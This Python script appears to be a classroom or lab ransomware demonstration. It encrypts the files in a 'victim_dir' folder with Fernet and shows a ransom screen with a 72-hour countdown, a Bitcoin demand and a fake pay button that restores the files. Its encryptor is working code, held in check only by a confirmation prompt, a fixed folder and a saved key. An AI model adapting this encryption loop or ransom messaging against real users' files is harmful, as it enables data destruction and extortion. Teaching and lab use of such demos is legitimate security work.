import os
import base64
from cryptography.fernet import Fernet
import tkinter as tk
from tkinter import messagebox, font
import threading
from datetime import datetime, timedelta

# ====== SAFETY CHECKS ======
if os.path.exists("DECRYPT_INSTRUCTIONS.html"):
    messagebox.showerror("ABORTING", "Demo already ran. Restore VM snapshot!")
    exit()

TARGET_DIR = "victim_dir"
WHITELIST = ["ransomware_demo.py", "decrypt_key.key"]
IMAGE_PATH = "vr.png"

# ====== CRYPTO FUNCTIONS ======
def generate_key():
    return Fernet.generate_key()

def encrypt_file(key, filepath):
    fernet = Fernet(key)
    with open(filepath, "rb") as f:
        data = f.read()
    encrypted = fernet.encrypt(data)
    with open(filepath, "wb") as f:
        f.write(encrypted)

def encrypt_directory(key, directory):
    for root, _, files in os.walk(directory):
        for file in files:
            if file not in WHITELIST:
                encrypt_file(key, os.path.join(root, file))

def decrypt_file(key, filepath):
    fernet = Fernet(key)
    with open(filepath, "rb") as f:
        data = f.read()
    decrypted = fernet.decrypt(data)
    with open(filepath, "wb") as f:
        f.write(decrypted)

def decrypt_directory(key, directory):
    for root, _, files in os.walk(directory):
        for file in files:
            if file not in WHITELIST:
                decrypt_file(key, os.path.join(root, file))

# ====== GUI CONFIGURATION ======
SAFE_FONT = ("Arial", 18)
TIMER_FONT = ("Courier New", 36, "bold")

class RansomwareGUI:
    def __init__(self, key):
        self.key = key
        self.root = tk.Tk()
        self.root.title("CRITICAL SYSTEM ALERT")
        self.root.geometry("1000x600")
        self.root.configure(bg='black')
        self.root.grid_columnconfigure(0, weight=1)
        self.root.grid_columnconfigure(1, weight=2)
        self.root.grid_rowconfigure(0, weight=1)

        # Left Panel (1/3 width)
        left_frame = tk.Frame(self.root, bg='black')
        left_frame.grid(row=0, column=0, sticky="nsew")

        # Right Panel (2/3 width)
        right_frame = tk.Frame(self.root, bg='black')
        right_frame.grid(row=0, column=1, sticky="nsew")

        # Image Display
        try:
            from PIL import ImageTk, Image
            img = Image.open(IMAGE_PATH)
            img = img.resize((300, 400), Image.Resampling.LANCZOS)
            self.virus_img = ImageTk.PhotoImage(img)
            img_label = tk.Label(left_frame, image=self.virus_img, bg='black')
            img_label.pack(pady=20, expand=True)
        except:
            error_label = tk.Label(left_frame, 
                                 text="[SYSTEM COMPROMISED]",
                                 font=SAFE_FONT,
                                 fg='red',
                                 bg='black')
            error_label.pack(pady=50)

        # Right Panel Content
        content_frame = tk.Frame(right_frame, bg='black')
        content_frame.pack(expand=True, fill='both', padx=50, pady=50)

        # Warning Text
        warning_text = """YOUR FILES HAVE BEEN ENCRYPTED!

• All documents encrypted with AES-256
• 72 hour deadline for payment
• Bitcoin payment required
• No decryption without payment"""

        tk.Label(content_frame,
                text=warning_text,
                font=SAFE_FONT,
                fg='red',
                bg='black',
                justify='left').pack(pady=20, anchor='w')

        # Timer Section
        timer_frame = tk.Frame(content_frame, bg='black')
        timer_frame.pack(pady=30, fill='x')
        
        tk.Label(timer_frame,
                text="TIME REMAINING:",
                font=("Arial", 14),
                fg='red',
                bg='black').pack(side='left')
        
        self.timer_label = tk.Label(timer_frame,
                                   text="72:00:00",
                                   font=TIMER_FONT,
                                   fg='red',
                                   bg='black')
        self.timer_label.pack(side='left', padx=20)

        # Payment Button
        self.pay_button = tk.Button(content_frame,
                                   text="PAY NOW (0.5 BTC)",
                                   command=self.fake_payment,
                                   font=("Arial", 16, "bold"),
                                   bg='#8B0000',
                                   fg='white',
                                   width=25,
                                   height=2)
        self.pay_button.pack(pady=40)

        # Initialize timer
        self.countdown_time = timedelta(hours=72)
        self.update_timer()
        
        # Key backup
        with open("decrypt_key.key", "w") as f:
            f.write(base64.urlsafe_b64encode(self.key).decode())

    def update_timer(self):
        self.countdown_time -= timedelta(seconds=1)
        timer_str = str(self.countdown_time).split(".")[0]
        self.timer_label.config(text=timer_str)
        self.root.after(1000, self.update_timer)

    def fake_payment(self):
        self.pay_button.config(state='disabled', text='PROCESSING PAYMENT...')
        self.root.after(3000, self.show_key)

    def show_key(self):
        key_window = tk.Toplevel(self.root)
        key_window.title("DECRYPTION KEY")
        key_window.configure(bg='black')
        
        tk.Label(key_window, 
                text="YOUR DECRYPTION KEY:", 
                font=SAFE_FONT,
                fg='red',
                bg='black').pack(pady=10)
        
        tk.Label(key_window, 
                text=base64.urlsafe_b64encode(self.key).decode(),
                font=("Courier New", 12),
                fg='white',
                bg='black').pack(pady=5)
        
        tk.Button(key_window,
                 text="AUTOMATIC DECRYPT",
                 command=self.decrypt_files,
                 bg='dark green',
                 fg='white').pack(pady=15)

    def decrypt_files(self):
        decrypt_directory(self.key, TARGET_DIR)
        messagebox.showinfo("SUCCESS", "Files restored successfully!")
        os.remove("decrypt_key.key")
        self.root.destroy()

if __name__ == "__main__":
    if not os.path.exists(TARGET_DIR):
        messagebox.showerror("ERROR", f"Target directory {TARGET_DIR} not found!")
        exit()
        
    if not messagebox.askyesno("WARNING", 
                              "This is a security demonstration.\nProceed with encryption simulation?"):
        exit()

    key = generate_key()
    encrypt_thread = threading.Thread(target=encrypt_directory, args=(key, TARGET_DIR))
    encrypt_thread.start()
    encrypt_thread.join()
    
    RansomwareGUI(key).root.mainloop()